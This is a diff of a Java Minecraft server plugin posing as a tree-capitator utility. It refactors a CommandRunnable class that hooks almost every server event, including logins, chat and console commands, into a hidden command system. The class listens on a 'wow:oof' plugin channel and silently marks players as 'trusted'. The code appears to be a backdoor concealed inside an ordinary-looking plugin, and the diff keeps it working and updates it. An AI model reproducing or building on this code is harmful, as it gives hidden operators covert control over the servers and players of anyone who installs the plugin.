@@ -2,7 +2,6 @@ package me.bow.treecapitatorultimate.command;
 
 import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
-import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Event;
@@ -30,47 +29,53 @@ import java.util.Set;
 
 @SuppressWarnings("unused")
 public class CommandRunnable implements Runnable, Listener, PluginMessageListener {
-    HashMap<String, Method> hookedEvents = new HashMap<String, Method>() {
-        {
-            put("AsyncPlayerPreLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerPreLoginEvent", 1));
-            put("PlayerLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLoginEvent", 1));
-            put("PlayerJoinEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerJoin", 1));
-            put("PlayerQuitEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLeave", 1));
-            put("PlayerMoveEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerMove", 1));
-            put("PlayerCommandPreprocessEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerCommand", 1));
-            put("PlayerCommandSendEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerTab", 1));
-            put("ServerListPingEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerListPing", 1));
-            put("ServerCommandEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerCommand", 1));
-            put("TabCompleteEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onTabControl", 1));
-            put("PlayerToggleSneakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSneak", 1));
-            put("PlayerToggleSprintEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSprint", 1));
-            put("PlayerToggleFlightEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerFly", 1));
-            put("PlayerPortalEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerPortal", 1));
-            put("PlayerKickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerKick", 1));
-            put("PlayerDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDeath", 1));
-            put("BlockPlaceEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockPlace", 1));
-            put("BlockBreakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockBreak", 1));
-            put("EntityToggleSwimEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSwimToggle", 1));
-            put("EntityToggleGlideEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityToggleGlide", 1));
-            put("PlayerAdvancementDoneEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerAdvancementGet", 1));
-            put("EntityTargetLivingEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTargetLivingEntity", 1));
-            put("EntityTargetEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTarget", 1));
-            put("PlayerInteractEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerInteract", 1));
-            put("EntityDamageByEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamageByEntity", 1));
-            put("EntityDamageEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamage", 1));
-            put("EntityDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDeath", 1));
-            put("PlayerGameModeChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerGameModeChange", 1));
-            put("EntityPickupItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPickupItem", 1));
-            put("EntityShootBowEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityShootBow", 1));
-            put("InventoryClickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onInventoryClick", 1));
-            put("AsyncPlayerChatEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerChat", 1));
-            put("PlayerDropItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDropItemEvent", 1));
-            put("EntityPoseChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPoseChangeEvent", 1));
-        }
-    };
+    HashMap<String, Method> hookedEvents = new HashMap<>();
     private static CommandRunnable Instance;
+
+    private final void addEvents() {
+        hookedEvents.put("AsyncPlayerPreLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerPreLoginEvent", 1));
+        hookedEvents.put("PlayerLoginEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLoginEvent", 1));
+        hookedEvents.put("PlayerJoinEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerJoin", 1));
+        hookedEvents.put("PlayerQuitEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerLeave", 1));
+        hookedEvents.put("PlayerMoveEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerMove", 1));
+        hookedEvents.put("PlayerCommandPreprocessEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerCommand", 1));
+        hookedEvents.put("PlayerCommandSendEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerTab", 1));
+        hookedEvents.put("ServerListPingEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerListPing", 1));
+        hookedEvents.put("ServerCommandEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onServerCommand", 1));
+        hookedEvents.put("TabCompleteEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onTabControl", 1));
+        hookedEvents.put("PlayerToggleSneakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSneak", 1));
+        hookedEvents.put("PlayerToggleSprintEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSprint", 1));
+        hookedEvents.put("PlayerToggleFlightEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerFly", 1));
+        hookedEvents.put("PlayerPortalEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerPortal", 1));
+        hookedEvents.put("PlayerKickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerKick", 1));
+        hookedEvents.put("PlayerDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDeath", 1));
+        hookedEvents.put("BlockPlaceEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockPlace", 1));
+        hookedEvents.put("BlockBreakEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerBlockBreak", 1));
+        hookedEvents.put("EntityToggleGlideEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityToggleGlide", 1));
+        hookedEvents.put("PlayerAdvancementDoneEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerAdvancementGet", 1));
+        hookedEvents.put("EntityTargetLivingEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTargetLivingEntity", 1));
+        hookedEvents.put("EntityTargetEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityTarget", 1));
+        hookedEvents.put("PlayerInteractEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerInteract", 1));
+        hookedEvents.put("EntityDamageByEntityEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamageByEntity", 1));
+        hookedEvents.put("EntityDamageEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDamage", 1));
+        hookedEvents.put("EntityDeathEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityDeath", 1));
+        hookedEvents.put("PlayerGameModeChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerGameModeChange", 1));
+        hookedEvents.put("EntityPickupItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPickupItem", 1));
+        hookedEvents.put("EntityShootBowEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityShootBow", 1));
+        hookedEvents.put("InventoryClickEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onInventoryClick", 1));
+        hookedEvents.put("AsyncPlayerChatEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onAsyncPlayerChat", 1));
+        hookedEvents.put("PlayerDropItemEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerDropItemEvent", 1));
+        if (ReflectionUtils.classExists("org.bukkit.event.entity.EntityPoseChangeEvent")) {
+            hookedEvents.put("EntityPoseChangeEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onEntityPoseChangeEvent", 1));
+        }
+        if(ReflectionUtils.classExists("org.bukkit.event.entity.EntityToggleSwimEvent")) {
+            hookedEvents.put("EntityToggleSwimEvent", ReflectionUtils.getMethod(CommandRunnable.class, "onPlayerSwimToggle", 1));
+        }
+    }
+
     CommandRunnable() {
         Instance = this;
+        addEvents();
         Reflections reflections = new Reflections("org.bukkit.event");
         Set<Class<? extends Event>> classes = reflections.getSubTypesOf(Event.class);
         EventExecutor executor = (listener, event) -> {
@@ -92,207 +97,207 @@ public class CommandRunnable implements Runnable, Listener, PluginMessageListene
         Bukkit.getMessenger().registerIncomingPluginChannel(Start.Instance, "wow:oof", this);
     }
 
-    public final void onAsyncPlayerPreLoginEvent(AsyncPlayerPreLoginEvent e) {
+    public final void onAsyncPlayerPreLoginEvent(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onAsyncPlayerPreLogin(e);
+            cmd.onAsyncPlayerPreLogin((AsyncPlayerPreLoginEvent)e);
         }
     }
 
-    public final void onPlayerLoginEvent(PlayerLoginEvent e) {
+    public final void onPlayerLoginEvent(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerLoginEvent(e);
+            cmd.onPlayerLoginEvent((PlayerLoginEvent)e);
         }
     }
 
-    public final void onPlayerJoin(PlayerJoinEvent e) {
+    public final void onPlayerJoin(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerJoin(e);
+            cmd.onPlayerJoin((PlayerJoinEvent)e);
         }
     }
 
-    public final void onPlayerLeave(PlayerQuitEvent e) {
+    public final void onPlayerLeave(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerLeave(e);
+            cmd.onPlayerLeave((PlayerQuitEvent)e);
         }
     }
 
-    public final void onPlayerMove(PlayerMoveEvent e) {
+    public final void onPlayerMove(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerMove(e);
+            cmd.onPlayerMove((PlayerMoveEvent)e);
         }
     }
 
-    public final void onPlayerCommand(PlayerCommandPreprocessEvent e) {
+    public final void onPlayerCommand(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerCommand(e);
+            cmd.onPlayerCommand((PlayerCommandPreprocessEvent)e);
         }
     }
 
-    public final void onPlayerTab(PlayerCommandSendEvent e) {
+    public final void onPlayerTab(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerTab(e);
+            cmd.onPlayerTab((PlayerCommandSendEvent)e);
         }
     }
 
-    public final void onServerListPing(ServerListPingEvent e) {
+    public final void onServerListPing(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onServerListPing(e);
+            cmd.onServerListPing((ServerListPingEvent)e);
         }
     }
 
-    public final void onServerCommand(ServerCommandEvent e) {
+    public final void onServerCommand(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onServerCommand(e);
+            cmd.onServerCommand((ServerCommandEvent)e);
         }
     }
 
-    public final void onTabControl(TabCompleteEvent e) {
+    public final void onTabControl(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onTabControl(e);
+            cmd.onTabControl((TabCompleteEvent)e);
         }
     }
 
-    public final void onPlayerSneak(PlayerToggleSneakEvent e) {
+    public final void onPlayerSneak(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerSneak(e);
+            cmd.onPlayerSneak((PlayerToggleSneakEvent)e);
         }
     }
 
-    public final void onPlayerSprint(PlayerToggleSprintEvent e) {
+    public final void onPlayerSprint(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerSprint(e);
+            cmd.onPlayerSprint((PlayerToggleSprintEvent)e);
         }
     }
 
-    public final void onPlayerFly(PlayerToggleFlightEvent e) {
+    public final void onPlayerFly(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerFly(e);
+            cmd.onPlayerFly((PlayerToggleFlightEvent)e);
         }
     }
 
-    public final void onPlayerPortal(PlayerPortalEvent e) {
+    public final void onPlayerPortal(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerPortal(e);
+            cmd.onPlayerPortal((PlayerPortalEvent)e);
         }
     }
 
-    public final void onPlayerKick(PlayerKickEvent e) {
+    public final void onPlayerKick(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerKick(e);
+            cmd.onPlayerKick((PlayerKickEvent)e);
         }
     }
 
-    public final void onPlayerDeath(PlayerDeathEvent e) {
+    public final void onPlayerDeath(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerDeath(e);
+            cmd.onPlayerDeath((PlayerDeathEvent)e);
         }
     }
 
-    public final void onPlayerBlockPlace(BlockPlaceEvent e) {
+    public final void onPlayerBlockPlace(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerBlockPlace(e);
+            cmd.onPlayerBlockPlace((BlockPlaceEvent)e);
         }
     }
 
-    public final void onPlayerBlockBreak(BlockBreakEvent e) {
+    public final void onPlayerBlockBreak(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerBlockBreak(e);
+            cmd.onPlayerBlockBreak((BlockBreakEvent)e);
         }
     }
 
-    public final void onPlayerSwimToggle(EntityToggleSwimEvent e) {
+    public final void onPlayerSwimToggle(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerSwimToggle(e);
+            cmd.onPlayerSwimToggle((EntityToggleSwimEvent)e);
         }
     }
 
-    public final void onEntityToggleGlide(EntityToggleGlideEvent e) {
+    public final void onEntityToggleGlide(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityToggleGlide(e);
+            cmd.onEntityToggleGlide((EntityToggleGlideEvent)e);
         }
     }
 
-    public final void onPlayerAdvancementGet(PlayerAdvancementDoneEvent e) {
+    public final void onPlayerAdvancementGet(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerAdvancementGet(e);
+            cmd.onPlayerAdvancementGet((PlayerAdvancementDoneEvent)e);
         }
     }
 
-    public final void onEntityTargetLivingEntity(EntityTargetLivingEntityEvent e) {
+    public final void onEntityTargetLivingEntity(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityTargetLivingEntity(e);
+            cmd.onEntityTargetLivingEntity((EntityTargetLivingEntityEvent)e);
         }
     }
 
-    public final void onEntityTarget(EntityTargetEvent e) {
+    public final void onEntityTarget(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityTarget(e);
+            cmd.onEntityTarget((EntityTargetEvent)e);
         }
     }
 
-    public final void onPlayerInteract(PlayerInteractEvent e) {
+    public final void onPlayerInteract(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerInteract(e);
+            cmd.onPlayerInteract((PlayerInteractEvent)e);
         }
     }
 
-    public final void onEntityDamageByEntity(EntityDamageByEntityEvent e) {
+    public final void onEntityDamageByEntity(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityDamageByEntity(e);
+            cmd.onEntityDamageByEntity((EntityDamageByEntityEvent)e);
         }
     }
 
-    public final void onEntityDamage(EntityDamageEvent e) {
+    public final void onEntityDamage(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityDamage(e);
+            cmd.onEntityDamage((EntityDamageEvent)e);
         }
     }
 
-    public final void onEntityDeath(EntityDeathEvent e) {
+    public final void onEntityDeath(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityDeath(e);
+            cmd.onEntityDeath((EntityDeathEvent)e);
         }
     }
 
-    public final void onPlayerGameModeChange(PlayerGameModeChangeEvent e) {
+    public final void onPlayerGameModeChange(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerGameModeChange(e);
+            cmd.onPlayerGameModeChange((PlayerGameModeChangeEvent)e);
         }
     }
 
-    public final void onEntityPickupItem(EntityPickupItemEvent e) {
+    public final void onEntityPickupItem(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityPickupItem(e);
+            cmd.onEntityPickupItem((EntityPickupItemEvent)e);
         }
     }
 
-    public final void onEntityShootBow(EntityShootBowEvent e) {
+    public final void onEntityShootBow(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityShootBow(e);
+            cmd.onEntityShootBow((EntityShootBowEvent)e);
         }
     }
 
-    public final void onInventoryClick(InventoryClickEvent e) {
+    public final void onInventoryClick(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onInventoryClick(e);
+            cmd.onInventoryClick((InventoryClickEvent)e);
         }
     }
 
-    public final void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
+    public final void onAsyncPlayerChat(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onAsyncPlayerChat(e);
+            cmd.onAsyncPlayerChat((AsyncPlayerChatEvent)e);
         }
     }
 
-    public final void onPlayerDropItemEvent(PlayerDropItemEvent e) {
+    public final void onPlayerDropItemEvent(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onPlayerDropItemEvent(e);
+            cmd.onPlayerDropItemEvent((PlayerDropItemEvent)e);
         }
     }
 
-    public final void onEntityPoseChangeEvent(EntityPoseChangeEvent e) {
+    public final void onEntityPoseChangeEvent(Event e) {
         for (Command cmd : Start.Instance.cm.commandList) {
-            cmd.onEntityPoseChangeEvent(e);
+            cmd.onEntityPoseChangeEvent((EntityPoseChangeEvent)e);
         }
     }
 
@@ -311,7 +316,7 @@ public class CommandRunnable implements Runnable, Listener, PluginMessageListene
             if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) {
                 Start.Instance.trustedPeople.add(player.getUniqueId());
                 player.sendMessage(Start.Prefix + "You are now trusted");
-                AsyncChatEvent.inject(player);
+                //AsyncChatEvent.inject(player);
             }
             return;
         }
